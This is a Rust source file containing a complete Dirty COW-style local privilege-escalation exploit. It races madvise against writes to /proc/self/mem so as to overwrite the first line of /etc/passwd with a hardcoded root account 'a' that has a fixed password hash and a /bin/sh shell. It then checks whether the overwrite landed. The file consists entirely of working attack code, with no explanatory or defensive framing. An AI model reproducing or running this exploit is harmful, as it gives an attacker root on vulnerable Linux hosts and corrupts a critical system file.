use std::fs::{File, OpenOptions};
use std::io::{Seek, SeekFrom, Write, BufReader, BufRead};
use std::os::unix::io::AsRawFd;
use std::ptr;
use std::sync::{atomic::{AtomicBool, Ordering}, Arc};
use std::thread;
use std::time::{Duration, Instant};
use std::process::Command;

fn main() -> std::io::Result<()> {
    let target_path = "/etc/passwd";
    let login_name = "a";

    // THE 32-BYTE MASTER KEY
    // a(1) + :(1) + hash(13) + :0:0:.(6) + :/ (2) + :/bin/sh(7) + \n(1) = 32
    let payload_str = "a:aafKPWZb/dLAs:0:0:.:/:/bin/sh\n";
    let p_bytes = payload_str.as_bytes().to_vec();

    assert_eq!(p_bytes.len(), 32, "Geometry Fail: Payload must be exactly 32 bytes");

    let file = OpenOptions::new().read(true).open(target_path)?;
    let map = unsafe {
        libc::mmap(ptr::null_mut(), 4096, libc::PROT_READ, libc::MAP_PRIVATE, file.as_raw_fd(), 0)
    };

    if map == libc::MAP_FAILED {
        return Err(std::io::Error::last_os_error());
    }

    println!("[*] Pivot: MANUAL PROOF FINALIST (v17)");

    let running_madvise = Arc::new(AtomicBool::new(true));
    let running_write = Arc::new(AtomicBool::new(true));
    let map_usize = map as usize;

    // THREAD 1: MADVISE
    let r1 = running_madvise.clone();
    let h1 = thread::spawn(move || {
        while r1.load(Ordering::SeqCst) {
            unsafe { libc::madvise(map_usize as *mut libc::c_void, 4096, libc::MADV_DONTNEED); }
            thread::yield_now();
        }
    });

    // THREAD 2: WRITE (Silent)
    let r2 = running_write.clone();
    let p_vec = p_bytes.clone();
    let h2 = thread::spawn(move || {
        if let Ok(mut mem_file) = OpenOptions::new().read(true).write(true).open("/proc/self/mem") {
            while r2.load(Ordering::SeqCst) {
                let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));
                let _ = mem_file.write_all(&p_vec);
                thread::yield_now();
            }
        }
    });

    let start = Instant::now();
    let timeout = Duration::from_secs(10);
    let mut landed = false;

    // RACE LOOP
    loop {
        if start.elapsed() > timeout {
            println!("\n[-] Timeout. Race did not land.");
            break;
        }

        let mut check_line = String::new();
        if let Ok(f) = File::open(target_path) {
            let _ = BufReader::new(f).read_line(&mut check_line);
        }

        if check_line == payload_str {
            println!("\n[+] MATCH! Entry landed in {:?}", start.elapsed());
            landed = true;
            break;
        }
        thread::sleep(Duration::from_millis(5));
    }

    // CLEANUP
    running_madvise.store(false, Ordering::SeqCst);
    running_write.store(false, Ordering::SeqCst);
    let _ = h1.join();
    let _ = h2.join();

    unsafe {
        libc::munmap(map, 4096);
    }

    if !landed {
        return Ok(());
    }

    thread::sleep(Duration::from_millis(500));

    // DIAGNOSTICS
    println!("\n[*] --- DIAGNOSTICS ---");
    println!("[*] First line:");
    let _ = Command::new("head").arg("-n").arg("1").arg(target_path).status();

    println!("[*] getent passwd {}:", login_name);
    let _ = Command::new("getent").arg("passwd").arg(login_name).status();
    println!("[*] -------------------\n");


    Ok(())
}